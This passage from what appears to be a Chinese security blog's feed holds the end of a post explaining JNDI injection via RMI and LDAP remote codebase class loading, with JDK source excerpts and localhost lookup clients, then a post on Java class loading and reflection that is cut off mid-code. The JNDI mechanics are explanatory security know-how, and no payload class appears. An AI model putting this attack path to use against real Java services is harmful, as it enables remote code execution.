                                 environment);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>通过getObjectFactoryFromReference或者getObjectInstance进行命令执行,这两个命令执行点都可以进行命令执行，不过第一个在执行的时候会发生报错，由于我们自定义的类实例化后不能转化为ObjectFactory，所以我们需要定义的类要继承该类，并且重写getObjectInstance接口，完成第二处命令执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">         clas = helper.loadClass(factoryName);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        <span class="comment">// ignore and continue</span></span><br><span class="line">        <span class="comment">// e.printStackTrace();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// All other exceptions are passed up.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Not in class path; try to use codebase</span></span><br><span class="line">    String codebase;</span><br><span class="line">    <span class="keyword">if</span> (clas == <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">            (codebase = ref.getFactoryClassLocation()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clas = helper.loadClass(factoryName, codebase);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (clas != <span class="keyword">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先尝试本地或者此class，在本地不存在此class的情况下，从codebase中获取此class并且进行加载和实例化</p><h4 id="RMI-JNDI注入原理"><a href="#RMI-JNDI注入原理" class="headerlink" title="RMI+JNDI注入原理"></a>RMI+JNDI注入原理</h4><p>当注册RMI服务的时候，可以指定远程加载类codebase url的位置，通过该属性可以让JNDI来加载我们指定的远程类，当<code>JNDI</code>应用程序通过<code>lookup</code>(RMI服务的地址)调用指定<code>codebase url</code>上的类后，会调用被远程调用类的构造方法，所以如果我们将恶意代码放在被远程调用类的构造方法中时，漏洞就会触发。</p><h4 id="RMI触发JNDI的限制"><a href="#RMI触发JNDI的限制" class="headerlink" title="RMI触发JNDI的限制"></a>RMI触发JNDI的限制</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">            ctx.lookup(<span class="string">"rmi://localhost:8080/refObj"</span>);</span><br><span class="line">            String data = <span class="string">"This is RMI Client."</span>;</span><br><span class="line">            <span class="comment">//System.out.println(serv.service(data));</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过上面这段代码，我们会发现我们是需要一个可控的参数的，并且在java高版本中和低版本的某些版本中<strong>系统属性 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false</strong>，即默认不允许从远程的Codebase加载Reference工厂类。</p><h3 id="LDAP-JNDI注入"><a href="#LDAP-JNDI注入" class="headerlink" title="LDAP+JNDI注入"></a>LDAP+JNDI注入</h3><p>除了RMI实现JNDI注入外，同样LDAP也可以实现JNDI注入，同RMI来对比，<code>LDAP</code>服务的<code>Reference</code>远程加载Factory类不受上一点中 <code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code>等属性的限制，不过在之后的版本，也对这些属性进行了限制，如 对com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false.</p><p>JNDIClient</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LDAPClient</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    String uri = <span class="string">"ldap://127.0.0.1:8088/aa"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        String uri = "rmi://127.0.0.1:1099/aa";</span></span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/02/27/30g2BF.png" alt="30g2BF.png"></p><p>调用过程和RMI触发JNDI差不多，就不详细分析了。</p><h4 id="LDAP触发JNDI注入的限制"><a href="#LDAP触发JNDI注入的限制" class="headerlink" title="LDAP触发JNDI注入的限制"></a>LDAP触发JNDI注入的限制</h4><p>其实和RMI的差不多，就不再赘述了。</p><h3 id="关于JNDI注入的一个问题"><a href="#关于JNDI注入的一个问题" class="headerlink" title="关于JNDI注入的一个问题"></a>关于JNDI注入的一个问题</h3><p>这个问题是看Seebug发现的，不过在调试RMI 触发的这个过程正好可以解决这个问题，文章的作者也给了很详细的说明</p><blockquote><p>Q:oC 里面向 rmi registry 绑定 ReferenceWrapper 的时候，真正绑定进去的应该是它的 Stub 才对，Stub 的对象是怎么造成客户端的代码执行的。</p></blockquote><p>对于这段代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(Name var1)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (var1.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> RegistryContext(<span class="keyword">this</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Remote var2;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var2 = <span class="keyword">this</span>.registry.lookup(var1.get(<span class="number">0</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotBoundException var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NameNotFoundException(var1.get(<span class="number">0</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)wrapRemoteException(var5).fillInStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.decodeObject(var2, var1.getPrefix(<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码的主要作用是从registry中拿出远程对象赋给var2,并且这个var2为stud类型</p><p>关键在于下一段的代码处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Object var3 = var1 <span class="keyword">instanceof</span> RemoteReference ?</span><br><span class="line">                ((RemoteReference)var1).getReference() : var1;</span><br><span class="line">        <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, </span><br><span class="line">                <span class="keyword">this</span>, <span class="keyword">this</span>.environment);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NamingException var5) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var5;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException var6) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (NamingException)wrapRemoteException(var6).fillInStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">        NamingException var4 = <span class="keyword">new</span> NamingException();</span><br><span class="line">        var4.setRootCause(var7);</span><br><span class="line">        <span class="keyword">throw</span> var4;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>decodeObject</code> 函数将 stub 还原成了 Reference，所以才可以造成代码执行。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://paper.seebug.org/417/" target="_blank" rel="noopener">https://paper.seebug.org/417/</a></p><p><a href="https://www.smi1e.top/java代码审计学习之jndi注入/" target="_blank" rel="noopener">https://www.smi1e.top/java%e4%bb%a3%e7%a0%81%e5%ae%a1%e8%ae%a1%e5%ad%a6%e4%b9%a0%e4%b9%8bjndi%e6%b3%a8%e5%85%a5/</a></p><p><a href="https://xz.aliyun.com/t/6633#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/6633#toc-5</a></p><p><a href="https://www.cnblogs.com/tr1ple/p/11558842.html" target="_blank" rel="noopener">https://www.cnblogs.com/tr1ple/p/11558842.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;基本概念介绍&quot;&gt;&lt;a href=&quot;#基本概念介绍&quot; class=&quot;headerlink&quot; title=&quot;基本概念介绍&quot;&gt;&lt;/a&gt;基本概念介绍&lt;/h3&gt;&lt;p&gt;本来不太想写这部分的…想了想…以后看的时候或许方便一些，还是写吧..&lt;/p&gt;
&lt;h3 id=&quot;RMI&quot;&gt;&lt;a
      
    
    </summary>
    
    
    
      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Java安全学习(一)--Class对象与反射</title>
    <link href="http://yoursite.com/2020/02/28/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80-Class%E5%AF%B9%E8%B1%A1%E4%B8%8E%E5%8F%8D%E5%B0%84/"/>
    <id>http://yoursite.com/2020/02/28/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80-Class%E5%AF%B9%E8%B1%A1%E4%B8%8E%E5%8F%8D%E5%B0%84/</id>
    <published>2020-02-27T16:36:51.000Z</published>
    <updated>2020-02-27T16:38:02.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="RTTI的理解与介绍"><a href="#RTTI的理解与介绍" class="headerlink" title="RTTI的理解与介绍"></a>RTTI的理解与介绍</h3><p>RTTI (Run-Time Type Identification) 运行时类型识别，作用为在运行时试别一个对象的类型和类的信息</p><p>在Java中的RTTI分为两种：传统的”RTTI”与反射机制</p><ul><li>对于传统的”RTTI”而言，一般是已经在编译期确定了他的类型（比如new)</li><li>第二种是反射机制 允许我们运行时发现，使用类的信息，而在java中</li></ul><p>用来表示运行时类型信息的对应类就是class类。</p><h3 id="类加载"><a href="#类加载" class="headerlink" title="类加载"></a>类加载</h3><p>jvm中有三个内置类加载器：</p><p>Bootstrap ClassLoader：启动类加载器，用于加载java核心库jre/lib/rt.jar</p><p>Extension ClassLoader：扩展类加载器，用于加载java扩展库jre/ext/*.jar</p><p>Application ClassLoader：应用程序类加载器，自己写的代码都是使用这个加载器来加载的</p><p>在类的加载过程中 需要通过双亲委派模型来进行加载，通过知乎上的一个图来理解一下</p><p><img src="https://s2.ax1x.com/2020/02/25/3tUkZQ.jpg" alt="3tUkZQ.jpg"></p><p>类加载的流程</p><p><img src="https://s2.ax1x.com/2020/02/25/3thEGV.jpg" alt="3thEGV.jpg"></p><ul><li>加载：类加载过程的一个阶段：通过一个类的完全限定查找此类字节码文件，并利用字节码文件创建一个Class对象</li><li>链接：验证字节码的安全性和完整性，准备阶段正式为静态域分配存储空间，注意此时只是分配静态成员变量的存储空间，不包含实例成员变量，如果必要的话，解析这个类创建的对其他类的所有引用。</li><li>初始化：类加载最后阶段，若该类具有超类，则对其进行初始化，执行静态初始化器和静态初始化成员变量</li></ul><h3 id="类初始化"><a href="#类初始化" class="headerlink" title="类初始化"></a>类初始化</h3><blockquote><p>在类初始化阶段，执行类构造器 <cinit>() 方法。<cinit> 类初始化方法有如下特点：</p><p>1.编译器会在将 .java 文件编译成 .class 文件时，收集所有类初始化代码和 static {} 域的代码，收集在一起成为 <cinit>() 方法；<br>        2.子类初始化时会首先调用父类的 <cinit>() 方法；</p></blockquote><h3 id="Class类与Class对象"><a href="#Class类与Class对象" class="headerlink" title="Class类与Class对象"></a>Class类与Class对象</h3><p>首先先看一下class类的部分源码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Class</span>&lt;<span class="title">T</span>&gt; <span class="keyword">implements</span> <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span>,<span class="title">GenericDeclaration</span>,<span class="title">Type</span>, <span class="title">AnnotatedElement</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> ANNOTATION= <span class="number">0x00002000</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> ENUM      = <span class="number">0x00004000</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> SYNTHETIC = <span class="number">0x00001000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">registerNatives</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        registerNatives();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Class</span><span class="params">(ClassLoader loader)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        classLoader = loader;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以清楚的看到class类的构造函数私有函数，也就是说class对象只能由JVM创建和加载。</p><p>接下来就详细的说一下class对象的作用：</p><p>Class对象代表着自己手动编写类的类型信息</p><p>当编写了一个A类，那么在编译的时候，JVM就就会创建一个A类对应的Class对象，并且该Class对象保存了A类对应的类型信息，并且将其保存在.class文件中，那么JVM的这么做的意义是什么呢？</p><p>当我们new一个新对象或者引用静态成员变量时，Java虚拟机(JVM)中的类加载器子系统会将对应Class对象加载到JVM中，然后JVM再根据这个类型信息相关的Class对象创建我们需要实例对象或者提供静态变量的引用值。所以class对象对于类的实例化是有着很大作用的，可以说他相当于类实例化的模板。</p><p>而我们也可以从这个过程中看出Java程序在它们开始运行之前并非被完全加载到内存的，其各个部分是按需加载。在使用一个类的时候，类加载器会先去看这个Class对象是否已经被加载，在没加载的情况情况下，类加载器会默认去加载.class文件，并且在这个字节码文件被加载的过程中需要接受安全机制的验证，最终加载到内存中。</p><p><strong>初始化是类加载的最后一个阶段，也就是说完成这个阶段后类也就加载到内存中(Class对象在加载阶段已被创建)，此时可以对类进行各种必要的操作了（如new对象，调用静态成员等），注意在这个阶段，才真正开始执行类中定义的Java程序代码或者字节码。</strong></p><h3 id="Java中反射机制"><a href="#Java中反射机制" class="headerlink" title="Java中反射机制"></a>Java中反射机制</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>Java反射机制是指在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性；这种动态获取的信息以及动态调用对象的方法的功能称为java语言的反射机制。</p><h4 id="Class对象的获取"><a href="#Class对象的获取" class="headerlink" title="Class对象的获取"></a>Class对象的获取</h4><h5 id="class-forName方法"><a href="#class-forName方法" class="headerlink" title="class.forName方法"></a>class.forName方法</h5><p>Class.forName(“类名”)  通过类名字符串来获取Class对象，当然这种方法在你不拥有该类对象的时候使用更为方便，在拥有类对象的时候，使用getClass方法获取class对象无疑是更合适的，也就是接下来要说的第二种Class 对象获取方法</p><h5 id="getClass方法"><a href="#getClass方法" class="headerlink" title="getClass方法"></a>getClass方法</h5><p>这种方法首先要创建类型的对象，再通过类型的对象来获得此对象的Class对象，并且这个方法属于Object类中的方法，它是所有类的祖先类，所以使用每个类的对象都可以调用这一方法。</p><h5 id="class-类字面常量"><a href="#class-类字面常量" class="headerlink" title=".class 类字面常量"></a>.class 类字面常量</h5><p>获取方法为类名.class,使用，但通过.class获取class对象与上面的两种方式是有不同之处的，使用<code>.class</code>方法获取Class对象引用时，并不会自动的初始化该类的Class对象。</p><p>看到一篇文章中的例子蛮经典的，拿来举例一下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Initable</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">static</span> final int staticFinal = <span class="number">47</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">static</span> final int staticFinal2 =</span><br><span class="line">    ClassInitialization.rand.nextInt(<span class="number">1000</span>);</span><br><span class="line">  <span class="keyword">static</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">"Initializing Initable"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Initable2</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">static</span> int staticNonFinal = <span class="number">147</span>;</span><br><span class="line">  <span class="keyword">static</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">"Initializing Initable2"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Initable3</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">static</span> int staticNonFinal = <span class="number">74</span>;</span><br><span class="line">  <span class="keyword">static</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">"Initializing Initable3"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">ClassInitialization</span> </span>&#123;</span><br><span class="line">  public <span class="keyword">static</span> Random rand = <span class="keyword">new</span> Random(<span class="number">47</span>);</span><br><span class="line">  public <span class="keyword">static</span> <span class="keyword">void</span> main(<span class="built_in">String</span>[] args) throws Exception &#123;</span><br><span class="line">    </span><br><span class="line">    Class initable = Initable.class;</span><br><span class="line">    System.out.println(<span class="string">"After creating Initable ref"</span>);</span><br><span class="line">    </span><br><span class="line">    System.out.println(Initable.staticFinal);</span><br><span class="line">    </span><br><span class="line">    System.out.println(Initable.staticFinal2);</span><br><span class="line">    </span><br><span class="line">    System.out.println(Initable2.staticNonFinal);</span><br><span class="line">    </span><br><span class="line">    Class initable3 = Class.forName(<span class="string">"Initable3"</span>);</span><br><span class="line">    System.out.println(<span class="string">"After creating Initable3 ref"</span>);</span><br><span class="line">    System.out.println(Initable3.staticNonFinal);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id=""><a href="#" class="headerlink" title=""></a></h5><p>运行结果：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">After creating Initable ref</span><br><span class="line"><span class="number">47</span></span><br><span class="line">Initializing Initable</span><br><span class="line"><span class="number">258</span></span><br><span class="line">Initializing Initable2</span><br><span class="line"><span class="number">147</span></span><br><span class="line">Initializing Initable3</span><br><span class="line">After creating Initable3 ref</span><br><span class="line"><span class="number">74</span></span><br></pre></td></tr></table></figure><p>从这个例子我们就可以明白我在上面所说的.class与getClass()和Class.forname的不同了。</p><p>通过.class获取的initable类的Class对象并没进行类的初始化，并且调用了staticFinal也没有进行类的初始化，而是在调用staticFinal2才触发到初始化。</p><p>因为staticFinal属于编译期静态常量，在编译阶段通过常量传播优化的方式将Initable类的常量<code>staticFinal</code>存储到了一个称为NotInitialization类的常量池中，之后的常量调用直接会从NotInitialization的常量池进行调用，而staticFinal2的调用触发初始化的原因是：虽然它也被static final修饰，但并不是常量，剩下的就比较好理解了，调用了静态常量触发了类初始化和Class.forName触发了类的初始化。</p><h5 id="获取类的所有变量"><a href="#获取类的所有变量" class="headerlink" title="获取类的所有变量"></a>获取类的所有变量</h5><ul><li>getFields: 获取所有public访问权限</li><li>getDeclaredFields: 获取本类的所有声明变量（无论什么权限）</li></ul><h5 id="获取类的方法"><a href="#获取类的方法" class="headerlink" title="获取类的方法"></a>获取类的方法</h5><ul><li>getMethods：获取自己声明的和父类继承的所有public方法</li><li>getDeclaredMethods ：获取本类的所有方法（任何访问权限）</li><li>getMethod : 方法返回一个特定的方法，第一个参数为方法名称，第二个为对应的class对象</li></ul><h5 id="通过反射来创建对象"><a href="#通过反射来创建对象" class="headerlink" title="通过反射来创建对象"></a>通过反射来创建对象</h5><p>还是先来一段代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Person&#123;"</span> +</span><br><span class="line">                <span class="string">"name='"</span> + name + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", age="</span> + age +</span><br><span class="line">                <span class="string">'&#125;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Persion类中有两个构造函数，分别public类型的有参构造函数和无参构造函数</p><ul><li>Public无参类型反射创建对象：对于这种无参类型的public构造函数，直接可以newInstance创建对象实例</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Person person=Person<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>()</span>;</span><br><span class="line">person.setAge(<span class="number">18</span>);</span><br><span class="line">person.setName(<span class="string">"likly"</span>);</span><br><span class="line">System.out.println(person);</span><br></pre></td></tr></table></figure><ul><li>对于有参数的public类型：通过getConstructor函数进行反射</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class p=Person<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">Constructor constructor=p.getConstructor(String<span class="class">.<span class="keyword">class</span>,<span class="title">int</span>.<span class="title">class</span>)</span>;</span><br><span class="line">Person person1 = (Person) constructor.newInstance(<span class="string">"Likly"</span>,<span class="number">23</span>);</span><br><span class="line">System.out.println(person1);</span><br></pre></td></tr></table></figure><ul><li>当构造函数为私有类型：getDeclaredMethod 的具体用法和 getMethod 类似， getDeclaredConstructor 的具体用法和<br>getConstructor 类似。</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span 